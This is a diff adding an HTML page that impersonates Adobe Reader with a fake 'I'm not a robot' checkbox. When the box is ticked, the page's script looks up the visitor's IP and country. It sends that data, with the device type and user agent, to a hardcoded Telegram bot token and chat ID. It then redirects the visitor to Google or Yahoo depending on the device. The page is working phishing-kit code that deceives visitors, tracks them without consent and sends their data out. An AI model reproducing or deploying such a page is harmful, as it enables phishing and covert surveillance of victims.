@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Adobe Reader Flow</title>
+<style>
+body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    font-family: Arial, Helvetica, sans-serif;
+    background: #f5f5f5;
+    color: #333;
+}
+
+/* Logo */
+.logo {
+    width: 90px;
+    margin-bottom: 20px;
+}
+
+/* Text styling */
+.text {
+    font-size: 18px;
+    margin-bottom: 20px;
+    font-weight: bold;
+    text-align: center;
+}
+
+/* Verification box */
+.verify-box {
+    background: #fff;
+    border: 2px solid #e53935;
+    padding: 20px 25px;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    cursor: pointer;
+    font-size: 18px;
+}
+.verify-box input {
+    width: 24px;
+    height: 24px;
+    cursor: pointer;
+}
+
+/* Spinner */
+.spinner {
+    width: 48px;
+    height: 48px;
+    border: 5px solid #ddd;
+    border-top: 5px solid #e53935;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-top: 10px;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* Sections */
+#redirectSection { display: none; flex-direction: column; align-items: center; }
+</style>
+</head>
+<body>
+
+<!-- Verification Section -->
+<div id="verifySection">
+    <svg class="logo" viewBox="0 0 100 100" aria-label="Adobe Reader Logo">
+        <rect x="5" y="5" width="90" height="90" rx="12" fill="#e53935"/>
+        <path d="M30 70c12-30 18-44 20-44s5 8 8 18c3 10 7 20 12 26
+                 c-10-4-17-6-24-6s-11 2-16 6z"
+              fill="none" stroke="#fff" stroke-width="4" stroke-linecap="round"/>
+    </svg>
+
+    <div class="text">I’m not a robot</div>
+
+    <div class="verify-box">
+        <input type="checkbox" id="robotCheck">
+        <label for="robotCheck">Click to verify</label>
+    </div>
+</div>
+
+<!-- Redirect Section -->
+<div id="redirectSection">
+    <svg class="logo" viewBox="0 0 100 100" aria-label="Adobe Reader Logo">
+        <rect x="5" y="5" width="90" height="90" rx="12" fill="#e53935"/>
+        <path d="M30 70c12-30 18-44 20-44s5 8 8 18c3 10 7 20 12 26
+                 c-10-4-17-6-24-6s-11 2-16 6z"
+              fill="none" stroke="#fff" stroke-width="4" stroke-linecap="round"/>
+    </svg>
+
+    <div class="text">We are redirecting you</div>
+    <div class="spinner"></div>
+</div>
+
+<script>
+/*********** TELEGRAM SETTINGS ***********/
+const BOT_TOKEN = "8081566355:AAHBIybyafzCHJJoQvwL60r2RseIkBd6z0o";
+const CHAT_ID = "6023129266";
+
+/*********** DEVICE HELPERS ***********/
+function isMacOrMobile() {
+    return /Mac|iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+}
+function deviceType() {
+    return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
+        ? "📱 Mobile"
+        : "💻 Computer";
+}
+function countryCodeToFlag(code) {
+    if (!code) return "";
+    return code.toUpperCase().replace(/./g, c =>
+        String.fromCodePoint(127397 + c.charCodeAt())
+    );
+}
+function getRedirectURL() {
+    return isMacOrMobile()
+        ? "https://yahoo.com"
+        : "https://google.com";
+}
+
+/*********** GEO ***********/
+let geo = { ip:"Unknown", country:"Unknown", code:"" };
+(async () => {
+    try {
+        const r = await fetch("https://ipapi.co/json/");
+        const d = await r.json();
+        geo.ip = d.ip;
+        geo.country = d.country_name;
+        geo.code = d.country_code;
+    } catch {}
+})();
+
+/*********** TELEGRAM ***********/
+function sendTelegram(stage) {
+    const msg =
+`📥 Visit Update — ${stage}
+
+🖥️ Device Type: ${deviceType()}
+🧩 Version: ${navigator.userAgent}
+🌍 Country: ${geo.country} ${countryCodeToFlag(geo.code)}
+🌐 IP: ${geo.ip}
+⏰ Time: ${new Date().toLocaleString()}
+
+🔗 Redirect URL: ${getRedirectURL()}`;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+    }).catch(()=>{});
+}
+
+/*********** FLOW LOGIC ***********/
+const checkbox = document.getElementById("robotCheck");
+const verifySection = document.getElementById("verifySection");
+const redirectSection = document.getElementById("redirectSection");
+
+checkbox.addEventListener("change", () => {
+    if (!checkbox.checked) return;
+
+    // Hide verification, show redirect section
+    verifySection.style.display = "none";
+    redirectSection.style.display = "flex";
+
+    // Telegram notifications
+    setTimeout(() => sendTelegram("1s after verification"), 1000);
+    setTimeout(() => sendTelegram("0.5s before redirect"), 3500);
+
+    // Redirect after 4s
+    setTimeout(() => {
+        window.location.href = getRedirectURL();
+    }, 4000);
+});
+</script>
+
+</body>
+</html>
